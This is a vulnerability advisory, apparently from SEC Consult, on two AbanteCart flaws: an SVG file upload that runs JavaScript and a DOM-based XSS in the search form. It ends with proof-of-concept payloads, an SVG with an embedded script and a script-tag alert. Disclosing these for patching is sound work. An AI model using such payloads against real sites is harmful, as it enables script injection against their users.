## Business recommendation

SEC Consult recommends all companies who are using the AbanteCart software, to upgrade to the latest version which is available at the vendor's official website.
 An in-depth security analysis performed by security professionals is highly advised, as the software may be affected from further security issues.

## Vulnerability overview/description

### 1) Unrestricted File Upload (CVE-2021-42051)

Any low privileged user with file upload permissions can upload malicious SVG files that contain a JavaScript payload.
 By proceeding to the SVG file location, the payload will be executed on the client-side.

### 2) DOM Based Cross-Site Scripting (CVE-2021-42050)

DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM "environment" in the victim's browser used by the original client-side script, so that the client-side code runs in an "unexpected" manner.

The application was found to have a cross-site scripting vulnerability where user supplied input is directly reflected in the Document Object Model, leading to execution of arbitrary code. The vulnerable location is an input form which allows users to perform search actions.

## Proof of concept

### 1) Unrestricted File Upload (CVE-2021-42051)

A PoC SVG file can be created as follows:

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);
stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("sectest XSS");
   </script>
</svg>
```
### 2) DOM Based Cross-Site Scripting (CVE-2021-42050)

A payload was used in the search engine:

```
<script>alert(document.domain)</script>
```
